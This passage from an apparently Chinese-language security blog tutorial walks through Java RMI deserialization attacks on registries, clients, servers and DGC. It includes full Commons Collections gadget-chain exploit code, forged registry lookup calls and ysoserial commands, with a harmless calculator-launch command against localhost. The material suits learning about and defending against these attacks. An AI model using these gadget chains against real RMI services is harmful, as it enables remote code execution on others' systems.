class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map)constructor.newInstance(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class,map); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        <span class="comment">// 获取ref</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(r);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为lookup只能传参为String类型所以需要伪造lookup的方法进行调用</p><p>具体看图</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232199268-fe991e3e-c19f-4ee2-a71b-bb0f554b30e4.png" alt=""></p><p>可以看到会进到lookup的方法里。</p><h3 id="攻击客户端">攻击客户端</h3><h4 id="注册中心攻击客户端">注册中心攻击客户端</h4><p>直接使用工具 yso</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span>  CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span></span><br></pre></td></tr></table></figure><p>受害端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.lookup(<span class="string">&quot;ttt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在客户端下断点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232920806-8fc9713f-fd3a-4491-92ec-6e28a12561ce.png" alt=""><br>跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232972828-6e421865-a276-4837-ac13-fa599e9dd79a.png" alt=""></p><p>跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232993864-7b9fbc26-fd66-4890-95d9-dbb6aac38ba0.png" alt=""></p><p>这里是触发点，也就是当时分析的反序列化2。list方法也是一样</p><h4 id="服务端攻击客户端">服务端攻击客户端</h4><p>恶意服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">RmiDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IRemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">IRemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">RmiDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) constructor.newInstance(innermap, chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class, map); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>受害端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        String[] list = registry.list();</span><br><span class="line">        <span class="keyword">for</span> (String i : list) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已经注册的服务：&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">rmiDemo</span> <span class="operator">=</span> (IRemoteObj)registry.lookup(<span class="string">&quot;RmiDemo&quot;</span>);</span><br><span class="line">        rmiDemo.RmiDemo();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记得在受害端也定义一下接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">RmiDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个也是会调用invoke方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235052452-d3964947-c6d8-43c9-8329-0f2e17aeaa37.png" alt=""></p><p>跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235062325-0988d18c-2b60-4f6d-af53-e1cb1fba03a7.png" alt=""></p><p>跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235077577-e5e0c46d-c300-49d2-9087-c6725512f730.png" alt=""></p><p>最后来到unmarshavalue方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235104366-b133adee-1bcb-478b-819e-d556ee46aaca.png" alt=""></p><p>因为我们服务端返回的是obejct所以会走到else里面进行反序列化和上文所说的反序列化5一样</p><h3 id="攻击服务端">攻击服务端</h3><h4 id="客户端攻击服务端">客户端攻击服务端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 从Registry中检索远程对象的存根/代理</span></span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteQing</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remote&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> remoteQing.RmiDemo(payload());</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"> </span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是要求服务端要有一个接受客户端传来的对象。就不再详细跟了和反序列化7一样</p><h3 id="DGC攻击">DGC攻击</h3><p>这里使用yso工具攻击</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1099</span>  CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span></span><br></pre></td></tr></table></figure><p>受害服务端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">iRemoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IRemoteObjImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;RmiDemo&quot;</span>,iRemoteObj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733243208736-36ef428c-09cd-40b9-ab00-1148145203ec.png" alt=""></p><p>其实能够看到他会进入DGCImpl_Skel的dispatch方法中然后触发反序列化</p><p>堆栈</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733243390142-c75bc6ea-3b52-4b40-8c57-534439121d69.png" alt=""></p><p>直接通过socket向注册中心发送序列化数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 